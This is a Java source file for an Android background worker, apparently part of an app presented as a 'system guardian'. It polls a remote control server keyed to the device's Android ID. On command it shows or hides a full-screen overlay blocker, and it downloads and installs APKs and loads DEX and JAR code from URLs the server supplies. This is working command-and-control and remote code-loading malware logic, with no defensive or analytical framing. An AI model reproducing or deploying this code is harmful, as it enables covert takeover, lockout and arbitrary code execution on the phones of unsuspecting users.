package com.system.guardian;

import android.annotation.SuppressLint;
import android.content.Context;
import android.provider.Settings;

//import androidx.annotation.NonNull;
import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.system.guardian.dex_patch_build.PatchInstaller;

import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.net.URL;

public class ControlPollerWorker extends Worker {

    //public ControlPollerWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
    public ControlPollerWorker(Context context, WorkerParameters workerParams) {    
        super(context, workerParams);
    }

    //@NonNull
    @SuppressLint("SetWorldReadable")
    @NonNull
    @Override
    public Result doWork() {
        Context context = getApplicationContext();
        try {
            @SuppressLint("HardwareIds")
            String token = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
            String url = "https://digiserve25.pythonanywhere.com/control/" + token + ".json";

            JSONObject response = NetworkUtils.getJsonFromUrl(url, context);
            if (response == null) {
                CrashLogger.log(context, "PollerWorker", "❌ JSON fetch failed — response null.");
                return Result.failure();
            }

            CrashLogger.log(context, "PollerWorker", "📦 JSON Response: " + response.toString());

            // Handle override state
            if (response.has("status") && response.has("value")) {
                String status = response.getString("status");
                String value = response.getString("value");

                if ("override".equals(status)) {
                    if ("on".equals(value)) {
                        CrashLogger.log(context, "PollerWorker", "🛰️ Override ON");
                        OverlayBlocker.show(context);
                    } else {
                        CrashLogger.log(context, "PollerWorker", "🛰️ Override OFF");
                        OverlayBlocker.hide(context);
                    }
                }
            }

            // Handle APK
            String apkUrl = response.optString("apk_url", "");
            CrashLogger.log(context, "PollerWorker", "🔍 apk_url: " + apkUrl);
            if (isValidUrl(apkUrl)) {
                File apkFile = NetworkUtils.downloadFile(context, apkUrl, new File("update.apk"));
                if (apkFile.exists()) {
                    CrashLogger.log(context, "PollerWorker", "📦 Installing APK...");
                    PatchInstaller.install(context, apkFile);
                }
            }

            // Handle DEX
            String dexUrl = response.optString("dex_url", "");
            CrashLogger.log(context, "PollerWorker", "🔍 dex_url: " + dexUrl);
            if (isValidUrl(dexUrl)) {
                File dexFile = NetworkUtils.downloadFile(context, dexUrl, new File("patch.dex"));
                if (dexFile.exists()) {
                    CrashLogger.log(context, "PollerWorker", "🧬 DEX patch ready");
                    DexLoader.schedulePatchLoad(context, dexFile);
                }
            }

            // Handle JAR
            String jarUrl = response.optString("jar_url", "");
            CrashLogger.log(context, "PollerWorker", "🔍 jar_url: " + jarUrl);
            if (isValidUrl(jarUrl)) {
                File tempDownload = new File(context.getCacheDir(), "patch-temp.jar");
                File safeJar = new File(context.getNoBackupFilesDir(), "patch.jar");

                File downloaded = NetworkUtils.downloadFile(context, jarUrl, tempDownload);

                if (downloaded.exists()) {
                    if (safeJar.exists()) safeJar.delete(); // Ensure clean state

                    try (
                            FileInputStream in = new FileInputStream(downloaded);
                            FileOutputStream out = new FileOutputStream(safeJar)
                    ) {
                        byte[] buffer = new byte[4096];
                        int len;
                        while ((len = in.read(buffer)) > 0) {
                            out.write(buffer, 0, len);
                        }
                        out.flush(); // flush write stream before permission change
                    }

                    boolean writable = safeJar.setWritable(false);
                    boolean readable = safeJar.setReadable(true, false);

                    // 🚨 Permission validation log
                    CrashLogger.log(context, "JarFix", (writable ? "✅" : "❌") + " Writable = false");
                    CrashLogger.log(context, "JarFix", (readable ? "✅" : "❌") + " Readable = true");
                    CrashLogger.log(context, "JarFix", "🔍 patch.jar — canRead=" + safeJar.canRead() + ", canWrite=" + safeJar.canWrite());

                    DexLoader.schedulePatchLoad(context, safeJar, true);

                } else {
                    CrashLogger.log(context, "JarDownload", "❌ patch-temp.jar missing after download");
                }
            }

            return Result.success();

        } catch (Exception e) {
            CrashLogger.log(getApplicationContext(), "PollerWorker", "❌ Unexpected failure: " + e.getMessage());
            return Result.failure();
        }
    }

    // Utility method for safe URL validation
    private static boolean isValidUrl(String urlStr) {
        if (urlStr == null || urlStr.trim().isEmpty()) return false;
        try {
            URL url = new URL(urlStr);
            return url.getProtocol().startsWith("http");
        } catch (Exception e) {
            return false;
        }
    }
}
